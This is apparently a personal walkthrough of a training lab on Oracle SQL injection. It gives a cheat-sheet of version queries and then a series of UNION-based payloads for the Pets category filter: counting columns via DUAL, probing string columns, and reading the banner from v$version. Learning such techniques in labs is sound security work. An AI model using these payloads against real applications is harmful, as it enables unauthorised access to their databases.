


## End Goal: To solve the lab, display the database version string. 


## From cheatsheet

## Database version

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

|   |   |
|---|---|
|Oracle|`SELECT banner FROM v$version   SELECT version FROM v$instance   `|
|Microsoft|`SELECT @@version`|
|PostgreSQL|`SELECT version()`|
|MySQL|`SELECT @@version`|


## Burp

GET /filter?category=Pets HTTP/2


## Finding the number of column

`Pets ' union select null , null ,null --`
this gives internal error because in oracle 
SELECT statement must have a FROM clause
Fortunately, Oracle provides you with the DUAL table which is a special table that belongs to the schema of the user SYS but it is accessible to all users.

so,

`Pets ' union select  null ,null from DUAL --`


number of columns found = 2


# finding column with string data type

`Pets ' union select  'a' ,'a' from DUAL --`

both column is of string data type

# Solving the end goal


`Pets ' union select banner , null FROM v$version -- `




